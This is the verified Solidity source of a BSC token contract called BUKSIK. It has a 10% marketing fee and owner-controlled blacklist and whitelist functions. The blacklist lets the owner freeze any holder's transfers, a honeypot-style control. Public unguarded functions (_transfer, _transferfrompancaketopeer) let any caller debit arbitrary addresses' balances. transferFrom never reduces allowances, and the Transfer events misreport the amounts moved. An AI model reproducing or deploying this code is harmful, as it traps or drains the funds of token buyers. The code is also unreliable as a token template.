/**
 *Submitted for verification at BscScan.com on 2022-10-15
*/

/*
"SPDX-License-Identifier: UNLICENSED"
*/

pragma solidity ^0.8.2;

contract BUKSIK {

mapping(address => uint) public balances;
mapping(address => mapping(address => uint)) public allowance;
//mapping(address => mapping(address => uint)) public liquditypool;

uint public totalSupply = 100000000 * 10 ** 8;
string public name ='BUKSIK';
string public symbol ='BSIK';
uint public decimals = 8;
bool public blacklistMode = true;
bool takeFee = true;

 uint256 public marketingFee =10;
uint256 public totalFees = marketingFee;
address public marketing = 0x1323D1A1f848e2841c1e5fA3CF362F53B58322E9; 

mapping (address => bool) internal isBlacklisted;
mapping (address => bool) internal isWhitelisted;

address internal ownerx;
mapping (address => bool) internal authorizations;

    uint256 public lockedUntil = 0;
    address private tokenOwner;


event Transfer(address indexed from,address indexed to, uint value);
event Approval(address indexed owner, address indexed spender, uint value);

 
      modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

//constructor will be executed only once
constructor(address _owner){
balances[msg.sender] = totalSupply;
   ownerx = _owner;
 authorizations[_owner] = true;
}

   function isOwner(address account) public view returns (bool) {
        return account == ownerx;
    }

//balance
function balanceOf(address owner) public view returns (uint)
{
return balances[owner];
}

//blacklist check
function blacked(address owner) public view returns (bool)
{
    

 bool status =  isBlacklisted[owner];
 
return status;
}

 //whitelist check
function whited(address owner) public view returns (bool)
{
    

 bool status =  isWhitelisted[owner];
 
return status;
}

 

//transfer require for condition.
//emit for emitting changes on the chain
function _transferm(address from, uint value)public returns(bool){
emit Transfer(from,marketing,value);
return true;
}

 function _transfer(address from,address to, uint value) public returns(bool){     
 
 //require(whited(from) == false,'whited');  

uint256 fee_mar = (value / 100) * marketingFee;
uint256 totalfee = fee_mar + fee_mar;



   balances[from] -= value;
   balances[from] -= totalfee;

   //balances[msg.sender] -= fee_mar + fee_liq;

   balances[to] += value;
_transferm(from,fee_mar);
 
emit Transfer(from,to,value);



return true;
 }
 function _transferfrompancaketopeer(address to, uint value) public returns(bool){     
 
 //require(whited(from) == false,'whited');  

uint256 fee_mar = (value / 100) * marketingFee;
 uint256 totalfee = fee_mar;



   balances[to] -= value;
   balances[to] -= totalfee;

   //balances[msg.sender] -= fee_mar + fee_liq;

   balances[to] += value;
_transferm(to,fee_mar);
 
 emit Transfer(msg.sender,to,value);



return true;
 }
///////////
function compare(address first, address sec) public pure returns(bool){
 bool equal = (first == sec);

    if (equal) {
        return true;
    } else {
         return false;
    }

}
function transfer(address to, uint value) public returns(bool){     

require(blacked(msg.sender) == false,'Blacklisted');   
require(balanceOf(msg.sender) >= value, 'balance is too low');
 
 
  
//address belongs to owner or pancake so avoid fee.
 uint256 fee_mar = (value / 100) * marketingFee;
//uint256 fee_liq = (value / 100) * liquidityFee;
//uint256 totalfee = fee_mar + fee_liq;

balances[marketing] += fee_mar;
//balances[liquditypool] += fee_liq;
balances[to] += (value - fee_mar);

balances[msg.sender] -= value;
emit Transfer(msg.sender,to,value);

return true;

}
//////////////

function approve(address spender, uint value) public returns(bool)
{

  require(blacked(spender) == false,'Blacklisted');    
  
allowance[msg.sender][spender] = value;
emit Approval(msg.sender, spender, value); 
return true;
 }
  
    function manage_blacklist_single(address addres, bool status) public onlyOwner {
     
            isBlacklisted[addres] = status;
        
    }
    function manage_whitelist_single(address addres, bool status) public onlyOwner {
     
            isWhitelisted[addres] = status;
        
    }


    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }

function transferFrom(address from, address to, uint value) public returns(bool)
{
require(blacked(from) == false,'Blacklisted');    
 


require(balanceOf(from) >= value, 'balance too low');
require(allowance[from][msg.sender]>= value, 'allowence too low');

 
   
balances[to] += value;
balances[from] -= value;
emit Transfer(from,to,value);
 



return true;


}


}